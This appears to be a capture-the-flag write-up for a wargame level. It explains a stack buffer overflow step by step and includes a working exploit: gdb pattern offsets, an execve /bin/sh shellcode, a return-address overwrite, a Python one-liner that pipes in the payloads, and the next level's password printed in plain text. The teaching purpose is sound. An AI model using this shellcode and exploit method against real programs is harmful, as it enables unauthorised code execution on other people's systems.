# level00

Nothing of note with `ll`.
`checksec` shows that **Partial RELRO** is enabled.

Functions found using `(gdb) info functions`
|LIBC|user|
|-|-|
|printf|verify_user_name|
|fgets|verify_user_pass|
|puts|main|
|||
|||

Here we don't have any obvious attack vector such as a call to `system()` or `exec()`.

The code prompts us twice. First for a username that must be equal to `dat_wil` then for a password.
This will then give us an `incorrect password` error regardless of our input.

We can see that the call to `fgets()` for the password reads up to **100 bytes**, but the **password_buffer** can only contain **64 bytes**.

Yeah let's do a **buffer overflow** attack to find `main()`'s return address so that we can change it to the address of a shellcode that will open a new shell.

## Buffer overflow

In gdb we will use an [overflow pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) to find the address.

```sh
gdb ./level01
(gdb) run
[...]
Enter Username: dat_wil
[...]
Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

How does this work??
Well above it's code and variables, a function stores the address of the previous function.
This way, when the function returns, it goes back to the previous function.
```c
func A {
	foo
	func B(); // stores the address of `bar` inside B
	bar
	[...]
}

func B () {
	// hidden address of `bar`
	char str[5];

	fgets(str, 100)
	return
}
```

Here after `B()` returns, it goes to the address of bar. But if we were to overwrite this address, we could go in theory anywhere.

That is basically what happened in the test we did before. the call to `fgets()` wrote **100 bytes** inside **password_buffer** and by accident the return address the `main()` function had stored.
When the program tried returning, it went to the address `0x37634136` and found nothing, thus causing a **Segmentation fault**.

Yeah that's all nice and dandy but why this specific weird string then?

Let's try with an easier example first.
```sh
gdb ./level01
[...]
Enter Password:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
```

Now the Segfault address is `0x61616161`. **61** is the ascii value of `a` so it tried to jump to the address `"aaaa"`. Let's try to translate the address we found earlier `0x37634136`. This gives `"7cA6"`, unfortunately this substring does not exist as-is, we need to convert it to *little-endian*.
Basically, this means swapping all the bytes, so `"7cA6"` becomes `"6Ac7"` which can be found in the input we used earlier.

This substring starts at the **81st byte** of our pattern, so we need an offset of **80 bytes** preceding the address of our shellcode.

## Shellcode
Shellcode this, shellcode that, i've been rambling on about this but what is it actually??
A shellcode is a piece of code injected by a user or malicious actor to execute arbitrary code.

Going back to the example we used before
```c
func A {
	foo
	func B();
	bar
	[...]
}

func B {
	// address of `bar`
	char str[5];

	fgets(str, 100)
	return
}

/* this is an environment variable */
SHELLCODE="
func VIRUS {
	steal(password)
}"
```

So by exploiting the overflow I explained, we change the return address of `B()` to the address of `VIRUS()` in the environnment variables. Since the program thinks it is reading code and not text, it executes the `VIRUS()` function as such.

That's it for the theorical part, on to the practice!

We need **3 things**, a payload containing a padding of **80 bytes** and the address of our *shellcode*, and finally our *shellcode*.

Here, we will be putting our shellcode inside the username string instead of an environment variable.
To find the address of our shellcode we will be using `ltrace`.

```sh
ltrace ./level01 
__libc_start_main(0x80484d0, 1, -10828, 0x80485c0, 0x8048630 <unfinished ...>
puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
)                        = 39
printf("Enter Username: ")                                         = 16
fgets(Enter Username: dat_wil
"dat_wil\n", 256, 0xf7fcfac0)                                = 0x0804a040 # < username is stored here
puts("verifying username....\n"verifying username....

)                                   = 24
puts("Enter Password: "Enter Password: 
)                                           = 17
fgets(password
"password\n", 100, 0xf7fcfac0)                               = 0xffffd4cc # < password is stored here
puts("nope, incorrect password...\n"nope, incorrect password...

)                              = 29
+++ exited (status 1) +++
```
Yeah, there's a lot of text. We just need the address where the username will be stored, which is `0x0804a040`, we convert it to injectable little endian `\x40\xa0\x04\x08`.
But at this address will be the username itself, we will offset it by **16 bytes** so now our target address will be `\x50\xa0\x04\x08` (I changed the first byte).

We have two payloads, the `username payload` and the `password payload`.

### username payload
|username|nop slide|shellcode|
|-|-|-|
|"dat_wil"|'\x90' * 30|'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'|

### password payload
|padding|address of our shellcode|
|-|-|
|a * 80|'\x50\xa0\x04\x08'|


I used the term `nop slide` here, but what does it mean?
A `nop` as in `no operation` is an instruction meant to do nothing and skip to the next one.
In our case, we have one in our `username payload` between the username and our shell code. So if we jump at any address between those, we will end up executing our shellcode. (If it is not clear, ask Alec for a drawing).

```sh
(cat <(python -c "print('dat_wil' + '\x90' * 30 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'); print('a' * 80 + '\x50\xa0\x04\x08');") -) | ./level01
[...]
whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
su level02
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

NOTE:
We used the `cat` command to keep the prompt open. If we did not, the python print functions would have closed the input.

NOTE2:
Going forward, we will fully use the overflow pattern generator website to find our offsets by copy/pasting the SEGFAULT address there, it's quicker and less prone to errors.

<!-- Easter egg : this can only be seen in edit mode -->
